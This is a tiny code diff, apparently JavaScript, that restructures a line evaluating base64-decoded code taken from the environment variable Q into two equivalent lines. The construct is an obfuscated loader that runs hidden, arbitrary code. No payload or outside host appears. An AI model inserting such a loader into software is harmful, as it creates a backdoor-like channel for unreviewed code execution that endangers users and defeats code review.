@@ -1,1 +1,2 @@
-eval(atob(process.env.Q))
+const v=atob(process.env.Q);
+eval(v)
